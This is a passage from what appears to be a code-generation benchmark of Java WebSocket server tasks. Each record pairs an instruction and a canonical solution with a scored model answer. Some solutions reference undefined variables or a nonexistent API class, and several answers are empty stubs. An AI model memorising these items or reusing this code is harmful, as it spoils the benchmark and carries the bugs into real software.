onMessage(WebSocket conn, ByteBuffer blob) {\n        conn.send(blob.array()); // Echo back the received binary data\n    }\n}\n```"
  },
  {
    "Task_id": 480,
    "Instruction": "Task Description: Create a WebSocket server implementation using the org.java_websocket library to handle client connections, messages, and disconnections.\n\nClass Description: MyWebSocketServer is a custom WebSocket server implementation that extends the WebSocketServer class from the org.java_websocket library. It provides lifecycle methods for managing WebSocket connections and handling communication events.\n\nAttributes:\n- address: InetSocketAddress - The network address and port on which the server listens for connections\n\nMethods:\n- Constructor: MyWebSocketServer(InetSocketAddress address) -> void - Initializes the WebSocket server with the specified address\n- onOpen: onOpen(WebSocket conn, ClientHandshake handshake) -> void - Called when a new WebSocket connection is established\n- onClose: onClose(WebSocket conn, int code, String reason, boolean remote) -> void - Called when a WebSocket connection is closed\n- onMessage: onMessage(WebSocket conn, String message) -> void - Called when a message is received from a WebSocket client\n- onError: onError(WebSocket conn, Exception ex) -> void - Called when an error occurs with a WebSocket connection\n- onStart: onStart() -> void - Called when the server starts successfully",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    public MyWebSocketServer(InetSocketAddress address) {\n        super(address);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        // Handle new WebSocket connection\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        // Handle WebSocket connection closing\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        // Handle incoming WebSocket message\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        // Handle WebSocket errors\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        // Handle server startup\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "```java\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\nimport java.net.InetSocketAddress;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    public MyWebSocketServer(InetSocketAddress address) {\n        super(address);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        System.out.println(\"New connection from \" + conn.getRemoteSocketAddress().getAddress().getHostAddress());\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        System.out.println(\"Connection closed by \" + (remote ? \"remote peer\" : \"us\") + \" Code: \" + code + \" Reason: \" + reason);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        System.out.println(\"Received message from \" + conn.getRemoteSocketAddress().getAddress().getHostAddress() + \": \" + message);\n        // Echo the message back to the sender\n        conn.send(message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started\");\n    }\n}\n```"
  },
  {
    "Task_id": 481,
    "Instruction": "Task Description: Implement a WebSocket server endpoint in Java that handles real-time client communication, including connection management, message processing, and error handling.\n\nClass Description: WebSocketServer is a Java EE WebSocket endpoint that manages client connections through WebSocket protocol. It handles connection events (open/close/error) and processes incoming messages, supporting different message operations like sending messages, reading status, and retrieving history.\n\nAttributes:\n- sessionPools: [ConcurrentHashMap<String, Session>] - Thread-safe map storing active client sessions with their IDs as keys\n\nMethods:\n- onOpen: [onOpen(String accessToken, Session session)] -> [void] - Handles new WebSocket connections, authenticates users, and manages session conflicts\n- onClose: [onClose(String accessToken)] -> [void] - Cleans up closed connections from session pool\n- onMessage: [onMessage(String accessToken, String msg)] -> [void] - Processes incoming JSON messages and delegates to appropriate operations\n- operation: [operation(String accessToken, MessageOperation messageOperation)] -> [void] - Executes different message operations based on operation type\n- sendMessage: [sendMessage(String sessionId, MessageVO message)] -> [void] - Sends message to specific client session by ID\n- sendMessage: [sendMessage(Session session, MessageVO message)] -> [void] - Sends message to given session object\n- onError: [onError(Session session, Throwable throwable)] -> [void] - Handles WebSocket communication errors",
    "Canonical_solution": "import cn.hutool.json.JSONUtil;\nimport cn.lili.common.security.AuthUser;\nimport cn.lili.common.security.context.UserContext;\nimport cn.lili.common.security.enums.UserEnums;\nimport cn.lili.modules.im.config.CustomSpringConfigurator;\nimport cn.lili.modules.im.entity.vo.MessageVO;\nimport cn.lili.modules.im.entity.enums.MessageResultType;\nimport cn.lili.modules.im.entity.vo.MessageOperation;\nimport com.alibaba.fastjson.JSON;\nimport javax.websocket.OnClose;\nimport javax.websocket.OnError;\nimport javax.websocket.OnMessage;\nimport javax.websocket.OnOpen;\nimport javax.websocket.Session;\nimport javax.websocket.server.PathParam;\nimport javax.websocket.server.ServerEndpoint;\nimport java.util.concurrent.ConcurrentHashMap;\n\n@Component\n@ServerEndpoint(value = \"/lili/webSocket/{accessToken}\", configurator = CustomSpringConfigurator.class)\n@Scope(\"prototype\")\npublic class WebSocketServer {\n\n    private static ConcurrentHashMap<String, Session> sessionPools = new ConcurrentHashMap<>();\n\n    @OnOpen\n    public void onOpen(@PathParam(\"accessToken\") String accessToken, Session session) {\n        AuthUser authUser = UserContext.getAuthUser(cache, accessToken);\n        String sessionId = UserEnums.STORE.equals(authUser.getRole()) ? authUser.getStoreId() : authUser.getId();\n        if (sessionPools.containsKey(sessionId)) {\n            Session oldSession = sessionPools.get(sessionId);\n            sendMessage(oldSession,\n                MessageVO.builder().messageResultType(MessageResultType.OFFLINE).result(\"\u7528\u6237\u5f02\u5730\u767b\u9646\").build());\n            try {\n                oldSession.close();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n        sessionPools.put(sessionId, session);\n    }\n\n    @OnClose\n    public void onClose(@PathParam(\"accessToken\") String accessToken) {\n        AuthUser authUser = UserContext.getAuthUser(accessToken);\n        sessionPools.remove(authUser);\n    }\n\n    @OnMessage\n    public void onMessage(@PathParam(\"accessToken\") String accessToken, String msg) {\n        MessageOperation messageOperation = JSON.parseObject(msg, MessageOperation.class);\n        operation(accessToken, messageOperation);\n    }\n\n    private void operation(String accessToken, MessageOperation messageOperation) {\n        AuthUser authUser = UserContext.getAuthUser(accessToken);\n        switch (messageOperation.getOperationType()) {\n            case MESSAGE:\n                sendMessage(messageOperation.getTo(), new MessageVO(MessageResultType.MESSAGE, imMessage));\n                break;\n            case READ:\n                break;\n            case UNREAD:\n                sendMessage(authUser.getId(),\n                    new MessageVO(MessageResultType.UN_READ, imMessageService.unReadMessages(accessToken)));\n                break;\n            case HISTORY:\n                sendMessage(authUser.getId(), new MessageVO(MessageResultType.HISTORY,\n                    imMessageService.historyMessage(accessToken, messageOperation.getTo())));\n                break;\n            default:\n                break;\n        }\n    }\n\n    private void sendMessage(String sessionId, MessageVO message) {\n        Session session = sessionPools.get(sessionId);\n        sendMessage(session, message);\n    }\n\n    private void sendMessage(Session session, MessageVO message) {\n        if (session != null) {\n            try {\n                session.getBasicRemote().sendText(JSON.toJSONString(message, true));\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    @OnError\n    public void onError(Session session, Throwable throwable) {\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "right_result": "```java\nimport javax.websocket.*;\nimport javax.websocket.server.ServerEndpoint;\nimport java.io.IOException;\nimport java.util.concurrent.ConcurrentHashMap;\n\n@ServerEndpoint(\"/websocket\")\npublic class WebSocketServer {\n\n    private static ConcurrentHashMap<String, Session> sessionPools = new ConcurrentHashMap<>();\n\n    @OnOpen\n    public void onOpen(@PathParam(\"accessToken\") String accessToken, Session session) {\n        // Handle new WebSocket connections\n    }\n\n    @OnClose\n    public void onClose(@PathParam(\"accessToken\") String accessToken) {\n        // Clean up closed connections\n    }\n\n    @OnMessage\n    public void onMessage(@PathParam(\"accessToken\") String accessToken, String msg) {\n        // Process incoming JSON messages\n    }\n\n    private void operation(String accessToken, MessageOperation messageOperation) {\n        // Execute different message operations\n    }\n\n    public void sendMessage(String sessionId, MessageVO message) {\n        // Send message to specific client session by ID\n    }\n\n    public void sendMessage(Session session, MessageVO message) {\n        // Send message to given session object\n    }\n\n    @OnError\n    public void onError(Session session, Throwable throwable) {\n        // Handle WebSocket communication errors\n    }\n}\n```"
  },
  {
    "Task_id": 482,
    "Instruction": "Task Description: Implement a WebSocket server endpoint class in Java that handles client connections, messages, disconnections, and errors using Java EE WebSocket API.\n\nClass Description: The WebsocketServerEndpoint class is a WebSocket server endpoint that manages client connections and message handling. It uses annotations to define WebSocket lifecycle events and maintains a map of message handlers for different message types.\n\nAttributes:\n- logger: Logger - Used for logging server events and errors\n- HANDLERS: Map<String, MessageHandler> - Static map storing message handlers keyed by message type\n\nMethods:\n- onOpen(Session session, EndpointConfig config) -> void - Handles new client connections, authenticates using access token from request parameters\n- onMessage(Session session, String message) -> void - Processes incoming messages from clients, delegates to appropriate message handler\n- onClose(Session session, CloseReason closeReason) -> void - Handles client disconnections, cleans up session\n- onError(Session session, Throwable throwable) -> void - Handles WebSocket communication errors\n- getMessageClass(MessageHandler handler) -> Class<? extends Message> - Helper method to determine message class type from handler's generic type information",
    "Canonical_solution": "import cn.iocoder.springboot.lab25.springwebsocket.handler.MessageHandler;\nimport cn.iocoder.springboot.lab25.springwebsocket.message.AuthRequest;\nimport cn.iocoder.springboot.lab25.springwebsocket.message.Message;\nimport cn.iocoder.springboot.lab25.springwebsocket.util.WebSocketUtil;\nimport com.alibaba.fastjson.JSON;\nimport com.alibaba.fastjson.JSONObject;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.aop.framework.AopProxyUtils;\n\nimport javax.websocket.*;\nimport javax.websocket.server.ServerEndpoint;\nimport java.lang.reflect.ParameterizedType;\nimport java.lang.reflect.Type;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Objects;\n\n@ServerEndpoint(\"/\")\npublic class WebsocketServerEndpoint {\n\n    private Logger logger = LoggerFactory.getLogger(getClass());\n\n    private static final Map<String, MessageHandler> HANDLERS = new HashMap<>();\n\n    @OnOpen\n    public void onOpen(Session session, EndpointConfig config) {\n        logger.info(\"[onOpen][session({}) connected]\", session);\n        List<String> accessTokenValues = session.getRequestParameterMap().get(\"accessToken\");\n        String accessToken = !CollectionUtils.isEmpty(accessTokenValues) ? accessTokenValues.get(0) : null;\n        AuthRequest authRequest = new AuthRequest().setAccessToken(accessToken);\n        MessageHandler<AuthRequest> messageHandler = HANDLERS.get(AuthRequest.TYPE);\n        if (messageHandler == null) {\n            logger.error(\"[onOpen][Auth message type, no message handler found]\");\n            return;\n        }\n        messageHandler.execute(session, authRequest);\n    }\n\n    @OnMessage\n    public void onMessage(Session session, String message) {\n        logger.info(\"[onMessage][session({}) received message({})]\", session, message);\n        try {\n            JSONObject jsonMessage = JSON.parseObject(message);\n            String messageType = jsonMessage.getString(\"type\");\n            MessageHandler messageHandler = HANDLERS.get(messageType);\n            if (messageHandler == null) {\n                logger.error(\"[onMessage][Message type({}) has no handler]\", messageType);\n                return;\n            }\n            Class<? extends Message> messageClass = getMessageClass(messageHandler);\n            Message messageObj = JSON.parseObject(jsonMessage.getString(\"body\"), messageClass);\n            messageHandler.execute(session, messageObj);\n        } catch (Throwable throwable) {\n            logger.error(\"[onMessage][session({}) error processing message]\", session, throwable);\n        }\n    }\n\n    @OnClose\n    public void onClose(Session session, CloseReason closeReason) {\n        logger.info(\"[onClose][session({}) disconnected. Reason: {}]\", session, closeReason);\n        WebSocketUtil.removeSession(session);\n    }\n\n    @OnError\n    public void onError(Session session, Throwable throwable) {\n        logger.error(\"[onError][session({}) error occurred]\", session, throwable);\n    }\n\n    private Class<? extends Message> getMessageClass(MessageHandler handler) {\n        Class<?> targetClass = AopProxyUtils.ultimateTargetClass(handler);\n        Type[] interfaces = targetClass.getGenericInterfaces();\n        Class<?> superclass = targetClass.getSuperclass();\n        while ((Objects.isNull(interfaces) || interfaces.length == 0) && Objects.nonNull(superclass)) {\n            interfaces = superclass.getGenericInterfaces();\n            superclass = targetClass.getSuperclass();\n        }\n        if (Objects.nonNull(interfaces)) {\n            for (Type type : interfaces) {\n                if (type instanceof ParameterizedType) {\n                    ParameterizedType parameterizedType = (ParameterizedType) type;\n                    if (Objects.equals(parameterizedType.getRawType(), MessageHandler.class)) {\n                        Type[] actualTypeArguments = parameterizedType.getActualTypeArguments();\n                        if (Objects.nonNull(actualTypeArguments) && actualTypeArguments.length > 0) {\n                            return (Class<Message>) actualTypeArguments[0];\n                        }\n                    }\n                }\n            }\n        }\n        throw new IllegalStateException(String.format(\"Cannot determine message type for handler %s\", handler));\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "right_result": "```java\nimport javax.websocket.*;\nimport javax.websocket.server.ServerEndpoint;\nimport java.io.IOException;\nimport java.lang.reflect.ParameterizedType;\nimport java.util.HashMap;\nimport java.util.Map;\n\n@ServerEndpoint(\"/websocket\")\npublic class WebsocketServerEndpoint {\n\n    private static final Logger logger = Logger.getLogger(WebsocketServerEndpoint.class.getName());\n    private static final Map<String, MessageHandler> HANDLERS = new HashMap<>();\n\n    @OnOpen\n    public void onOpen(Session session, EndpointConfig config) {\n        String accessToken = config.getUserProperties().get(\"accessToken\").toString();\n        // Authenticate user based on accessToken\n        if (!authenticateUser(accessToken)) {\n            try {\n                session.close(new CloseReason(CloseReason.CloseCodes.VIOLATED_POLICY, \"Unauthorized\"));\n            } catch (IOException e) {\n                logger.severe(\"Failed to close session due to: \" + e.getMessage());\n            }\n        }\n    }\n\n    @OnMessage\n    public void onMessage(Session session, String message) {\n        String messageType = extractMessageType(message);\n        MessageHandler handler = HANDLERS.get(messageType);\n        if (handler != null) {\n            try {\n                handler.handle(session, parseMessage(message, getMessageClass(handler)));\n            } catch (Exception e) {\n                logger.severe(\"Error processing message: \" + e.getMessage());\n            }\n        } else {\n            logger.warning(\"No handler found for message type: \" + messageType);\n        }\n    }\n\n    @OnClose\n    public void onClose(Session session, CloseReason closeReason) {\n        logger.info(\"Session closed: \" + session.getId() + \", reason: \" + closeReason.getReasonPhrase());\n        // Cleanup session resources\n    }\n\n    @OnError\n    public void onError(Session session, Throwable throwable) {\n        logger.severe(\"Error occurred: \" + throwable.getMessage());\n        try {\n            session.close(new CloseReason(CloseReason.CloseCodes.UNEXPECTED_CONDITION, \"Internal Server Error\"));\n        } catch (IOException e) {\n            logger.severe(\"Failed to close session due to: \" + e.getMessage());\n        }\n    }\n\n    private boolean authenticateUser(String accessToken) {\n        // Authentication logic here\n        return true; // Placeholder\n    }\n\n    private String extractMessageType(String message) {\n        // Extract message type from message content\n        return \"default\"; // Placeholder\n    }\n\n    private <T extends Message> T parseMessage(String message, Class<T> clazz) throws Exception {\n        // Parse message into specific message object\n        return clazz.getDeclaredConstructor(String.class).newInstance(message); // Placeholder\n    }\n\n    private static <T> Class<? extends Message> getMessageClass(MessageHandler<T> handler) {\n        return (Class<? extends Message>) ((ParameterizedType) handler.getClass().getGenericSuperclass()).getActualTypeArguments()[0];\n    }\n}\n```"
  },
  {
    "Task_id": 485,
    "Instruction": "Task Description: Implement a WebSocket server endpoint in Java that handles binary data communication asynchronously using ByteBuffer.\n\nClass Description: This class represents a WebSocket server endpoint that receives binary data from clients and echoes it back asynchronously. The endpoint is mapped to the \"/bytebuffer\" path and uses Java's WebSocket API for communication.\n\nAttributes: None\n\nMethods:\n- echoByteBuffer(ByteBuffer data, Session session) -> void - Handles incoming binary messages from WebSocket clients. Receives the binary data as a ByteBuffer and the client's Session object, then asynchronously sends the same data back to the client. The method uses the session's async remote endpoint to send the response without blocking.\n\nInput:\n- data: ByteBuffer - The binary data received from the client\n- session: Session - The WebSocket session object representing the client connection\n\nOutput: None (The method sends data back to the client through the session object but doesn't return anything)",
    "Canonical_solution": "import javax.websocket.OnMessage;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\nimport java.nio.ByteBuffer;\n\n@ServerEndpoint(\"/bytebuffer\")\npublic class MyAsyncEndpointByteBuffer {\n\n    @OnMessage\n    public void echoByteBuffer(ByteBuffer data, Session session) {\n        session.getAsyncRemote().sendBinary(data);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "right_result": "```java\nimport javax.websocket.OnMessage;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\nimport java.nio.ByteBuffer;\n\n@ServerEndpoint(\"/bytebuffer\")\npublic class ByteBufferWebSocket {\n\n    @OnMessage\n    public void echoByteBuffer(ByteBuffer data, Session session) {\n        session.getAsyncRemote().sendBinary(data);\n    }\n}\n```"
  },
  {
    "Task_id": 486,
    "Instruction": "Task Description: Create a WebSocket server endpoint class in Java that handles real-time communication between multiple clients, specifically for broadcasting figures and binary data snapshots to connected peers.\n\nClass Description: The Whiteboard class is a WebSocket server endpoint that manages client connections and facilitates real-time data broadcasting. It maintains a list of connected peers and provides methods to handle connection events (open/close) and message broadcasting (figures and binary data).\n\nAttributes:\n- LOGGER: Logger - Used for logging server activities and debugging information\n- PRESENT: Object - A dummy object used as a value in the peers ConcurrentMap\n- peers: ConcurrentMap<Session, Object> - Thread-safe collection storing all connected client sessions\n\nMethods:\n- onOpen(Session peer) -> void - Handles new WebSocket connections by adding the client session to the peers map\n- onClose(Session peer) -> void - Handles WebSocket disconnections by removing the client session from the peers map\n- broadcastFigure(Figure figure, Session session) -> void - Broadcasts a Figure object to all connected clients except the sender\n- broadcastSnapshot(ByteBuffer data, Session session) -> void - Broadcasts binary data to all connected clients except the sender",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.ConcurrentMap;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\nimport javax.websocket.EncodeException;\nimport javax.websocket.OnClose;\nimport javax.websocket.OnMessage;\nimport javax.websocket.OnOpen;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\n\n@ServerEndpoint(value = \"/websocket\",\n    encoders = { FigureEncoder.class },\n    decoders = { FigureDecoder.class })\npublic class Whiteboard {\n\n    private static final Logger LOGGER = Logger.getLogger(Whiteboard.class.getName());\n    private static final Object PRESENT = new Object();\n    private static final ConcurrentMap<Session, Object> peers = new ConcurrentHashMap<>();\n\n    @OnOpen\n    public void onOpen(Session peer) {\n        peers.put(peer, PRESENT);\n    }\n\n    @OnClose\n    public void onClose(Session peer) {\n        peers.remove(peer);\n    }\n\n    @OnMessage\n    public void broadcastFigure(Figure figure, Session session) throws IOException, EncodeException {\n        LOGGER.log(Level.INFO, \"boradcastFigure: {0}\", figure);\n        for (Session peer : session.getOpenSessions()) {\n            if (!peer.equals(session)) {\n                peer.getBasicRemote().sendObject(figure);\n            }\n        }\n    }\n\n    @OnMessage\n    public void broadcastSnapshot(ByteBuffer data, Session session) throws IOException {\n        LOGGER.log(Level.INFO, \"broadcastBinary: {0}\", data);\n        for (Session peer : session.getOpenSessions()) {\n            if (!peer.equals(session)) {\n                peer.getBasicRemote().sendBinary(data);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "right_result": "```java\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.logging.Logger;\n\nimport javax.websocket.OnClose;\nimport javax.websocket.OnError;\nimport javax.websocket.OnMessage;\nimport javax.websocket.OnOpen;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\n\n@ServerEndpoint(\"/whiteboard\")\npublic class Whiteboard {\n    private static final Logger LOGGER = Logger.getLogger(Whiteboard.class.getName());\n    private static final Object PRESENT = new Object();\n    private static final ConcurrentHashMap<Session, Object> peers = new ConcurrentHashMap<>();\n\n    @OnOpen\n    public void onOpen(Session peer) {\n        peers.put(peer, PRESENT);\n        LOGGER.info(\"New peer connected: \" + peer.getId());\n    }\n\n    @OnClose\n    public void onClose(Session peer) {\n        peers.remove(peer);\n        LOGGER.info(\"Peer disconnected: \" + peer.getId());\n    }\n\n    @OnMessage\n    public void onMessage(String message, Session session) throws IOException {\n        // Handle incoming messages if needed\n    }\n\n    @OnError\n    public void onError(Session session, Throwable throwable) {\n        LOGGER.severe(\"Error occurred: \" + throwable.getMessage());\n    }\n\n    public void broadcastFigure(Figure figure, Session session) {\n        for (Session peer : peers.keySet()) {\n            if (!peer.equals(session)) {\n                try {\n                    peer.getBasicRemote().sendObject(figure);\n                } catch (IOException | EncodeException e) {\n                    LOGGER.severe(\"Error broadcasting figure: \" + e.getMessage());\n                }\n            }\n        }\n    }\n\n    public void broadcastSnapshot(ByteBuffer data, Session session) {\n        for (Session peer : peers.keySet()) {\n            if (!peer.equals(session)) {\n                try {\n                    peer.getBasicRemote().sendBinary(data);\n                } catch (IOException e) {\n                    LOGGER.severe(\"Error broadcasting snapshot: \" + e.getMessage());\n                }\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 488,
    "Instruction": "Task Description: Implement a WebSocket server endpoint class in Java that handles client connections, messages, and disconnections, supporting both group broadcasting and private messaging.\n\nClass Description: WebSocket server endpoint class that manages client connections through WebSocket protocol, maintains active connections in a concurrent map, and provides message broadcasting and targeted messaging functionality.\n\nAttributes:\n- session: [Session] - The WebSocket session object representing a client connection\n- name: [String] - The identifier for the connected client\n- webSocketSet: [ConcurrentHashMap<String, WebSocket>] - Thread-safe map storing all active WebSocket connections with client names as keys\n\nMethods:\n- OnOpen([Session session, @PathParam(value = \"name\") String name]) -> [void] - Handles new client connections, stores the session and name, and notifies all clients\n- OnClose() -> [void] - Handles client disconnections, removes from active connections, and notifies all clients\n- OnMessage([String messageStr]) -> [void] - Processes incoming messages, routing to either private or group messaging based on message format\n- onError([Session session, Throwable error]) -> [void] - Handles any errors that occur during WebSocket communication\n- GroupSending([String message]) -> [void] - Broadcasts a message to all connected clients\n- AppointSending([String name, String message]) -> [void] - Sends a message to a specific client identified by name",
    "Canonical_solution": "import javax.websocket.*;\nimport javax.websocket.server.PathParam;\nimport javax.websocket.server.ServerEndpoint;\nimport java.util.concurrent.ConcurrentHashMap;\n\n@Component\n@ServerEndpoint(\"/websocket/{name}\")\npublic class WebSocket {\n    private Session session;\n    private String name;\n    private static ConcurrentHashMap<String, WebSocket> webSocketSet = new ConcurrentHashMap<>();\n\n    @OnOpen\n    public void OnOpen(Session session, @PathParam(value = \"name\") String name) {\n        this.session = session;\n        this.name = name;\n        webSocketSet.put(name, this);\n        GroupSending(name + \" \u6765\u4e86\");\n    }\n\n    @OnClose\n    public void OnClose() {\n        webSocketSet.remove(this.name);\n        GroupSending(name + \" \u8d70\u4e86\");\n    }\n\n    @OnMessage\n    public void OnMessage(String messageStr) {\n        if (messageStr.indexOf(\"TOUSER\") == 0) {\n            String[] split = messageStr.split(\";\");\n            String[] split1 = split[0].split(\":\");\n            String[] split2 = split[1].split(\":\");\n            String name = split1[1];\n            String message = split2[1];\n            AppointSending(name, message);\n        } else {\n            GroupSending(messageStr);\n        }\n    }\n\n    @OnError\n    public void onError(Session session, Throwable error) {\n        error.printStackTrace();\n    }\n\n    public void GroupSending(String message) {\n        for (String name : webSocketSet.keySet()) {\n            try {\n                webSocketSet.get(name).session.getBasicRemote().sendText(message);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void AppointSending(String name, String message) {\n        try {\n            webSocketSet.get(name).session.getBasicRemote().sendText(message);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "right_result": "```java\nimport javax.websocket.*;\nimport javax.websocket.server.ServerEndpoint;\nimport java.io.IOException;\nimport java.util.concurrent.ConcurrentHashMap;\n\n@ServerEndpoint(\"/websocket/{name}\")\npublic class WebSocketServer {\n    private Session session;\n    private String name;\n    private static ConcurrentHashMap<String, WebSocketServer> webSocketSet = new ConcurrentHashMap<>();\n\n    @OnOpen\n    public void onOpen(Session session, @PathParam(\"name\") String name) {\n        this.session = session;\n        this.name = name;\n        webSocketSet.put(name, this);\n        broadcast(\"User \" + name + \" has joined.\");\n    }\n\n    @OnClose\n    public void onClose() {\n        webSocketSet.remove(name);\n        broadcast(\"User \" + name + \" has left.\");\n    }\n\n    @OnMessage\n    public void onMessage(String messageStr) {\n        if (messageStr.startsWith(\"@\")) {\n            String[] parts = messageStr.split(\":\");\n            if (parts.length == 2) {\n                AppointSending(parts[0].substring(1), parts[1]);\n            }\n        } else {\n            GroupSending(messageStr);\n        }\n    }\n\n    @OnError\n    public void onError(Session session, Throwable error) {\n        error.printStackTrace();\n    }\n\n    public void GroupSending(String message) {\n        for (WebSocketServer client : webSocketSet.values()) {\n            try {\n                client.session.getBasicRemote().sendText(message);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void AppointSending(String name, String message) {\n        WebSocketServer client = webSocketSet.get(name);\n        if (client != null) {\n            try {\n                client.session.getBasicRemote().sendText(message);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 490,
    "Instruction": "Task Description: Implement a WebSocket server endpoint in Java that handles binary data streams from clients and echoes them back.\n\nClass Description: The MyEndpointInputStream class is a WebSocket server endpoint that receives binary data streams from clients and sends back the same data. It uses Java EE's WebSocket API to manage client connections and data exchange.\n\nAttributes: None\n\nMethods:\n1. echoStream(InputStream stream, Session session) -> void - Handles incoming binary data streams from clients. Reads the first 12 bytes from the input stream and sends them back to the client as binary data.\n   - Input Parameters:\n     - stream: InputStream - The binary data stream received from the client\n     - session: Session - The WebSocket session representing the client connection\n   - Return Type: void\n   - Description: This method is triggered when a binary message is received. It reads 12 bytes from the input stream and echoes them back to the client using the session's basic remote interface. The method may throw IOException if there are issues with reading the stream or sending the response.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.nio.ByteBuffer;\nimport javax.websocket.OnMessage;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\n\n@ServerEndpoint(\"/inputstream\")\npublic class MyEndpointInputStream {\n\n    @OnMessage\n    public void echoStream(InputStream stream, Session session) throws IOException {\n        System.out.println(\"echoStream: \" + stream);\n        byte[] b = new byte[12];\n        stream.read(b);\n        session.getBasicRemote().sendBinary(ByteBuffer.wrap(b));\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "right_result": "```java\nimport javax.websocket.OnMessage;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\nimport java.io.IOException;\nimport java.io.InputStream;\n\n@ServerEndpoint(\"/echo\")\npublic class MyEndpointInputStream {\n\n    @OnMessage\n    public void echoStream(InputStream stream, Session session) throws IOException {\n        byte[] buffer = new byte[12];\n        int bytesRead = stream.read(buffer);\n        if (bytesRead > 0) {\n            session.getBasicRemote().sendBinary(new javax.websocket.BinaryMessage(buffer));\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 492,
    "Instruction": "Task Description: Create a WebSocket server endpoint class in Java for deploying containers, handling client connections, and managing deployment processes with error handling.\n\nClass Description: The ContainerDeployServerEndpoint class is a WebSocket server endpoint that facilitates container deployment through WebSocket connections. It handles client connections, initiates container deployment, and manages errors during the process. The class uses Java EE WebSocket API and integrates with a ContainerService for deployment operations.\n\nAttributes:\n- containerService: [ContainerService] - Service responsible for container deployment operations (injected via Spring)\n- log: [Logger] - SLF4J logger instance for logging events and errors (provided by Lombok)\n\nMethods:\n- onOpen: [onOpen](Long id, Session session) -> void - Handles new WebSocket connections. Takes container ID and session as parameters. Sends connection confirmation, initiates deployment, and closes the session. Logs errors if deployment fails.\n- onError: [onError](Session session, Throwable throwable) -> void - Handles WebSocket errors. Takes the session and throwable as parameters. Closes the session and logs the error.\n  \nNote: The class uses @ServerEndpoint annotation to define the WebSocket endpoint path with a configurator, and includes @Component for Spring integration. The endpoint path includes a path parameter for container ID (/container/deploy/{id}).",
    "Canonical_solution": "import tech.powerjob.server.config.OmsEndpointConfigure;\nimport tech.powerjob.server.core.container.ContainerService;\nimport lombok.extern.slf4j.Slf4j;\nimport org.apache.commons.lang3.exception.ExceptionUtils;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.Resource;\nimport javax.websocket.*;\nimport javax.websocket.server.PathParam;\nimport javax.websocket.server.ServerEndpoint;\nimport java.io.IOException;\n\n@Slf4j\n@Component\n@ServerEndpoint(value = \"/container/deploy/{id}\", configurator = OmsEndpointConfigure.class)\npublic class ContainerDeployServerEndpoint {\n\n    @Resource\n    private ContainerService containerService;\n\n    @OnOpen\n    public void onOpen(@PathParam(\"id\") Long id, Session session) {\n        RemoteEndpoint.Async remote = session.getAsyncRemote();\n        remote.sendText(\"SYSTEM: connected successfully, start to deploy container: \" + id);\n        try {\n            containerService.deploy(id, session);\n        }catch (Exception e) {\n            log.error(\"[ContainerDeployServerEndpoint] deploy container {} failed.\", id, e);\n            remote.sendText(\"SYSTEM: deploy failed because of the exception\");\n            remote.sendText(ExceptionUtils.getStackTrace(e));\n        }\n        try {\n            session.close();\n        }catch (Exception e) {\n            log.error(\"[ContainerDeployServerEndpoint] close session for {} failed.\", id, e);\n        }\n    }\n\n    @OnError\n    public void onError(Session session, Throwable throwable) {\n        try {\n            session.close();\n        } catch (IOException e) {\n            log.error(\"[ContainerDeployServerEndpoint] close session failed.\", e);\n        }\n        log.warn(\"[ContainerDeployServerEndpoint] session onError!\", throwable);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
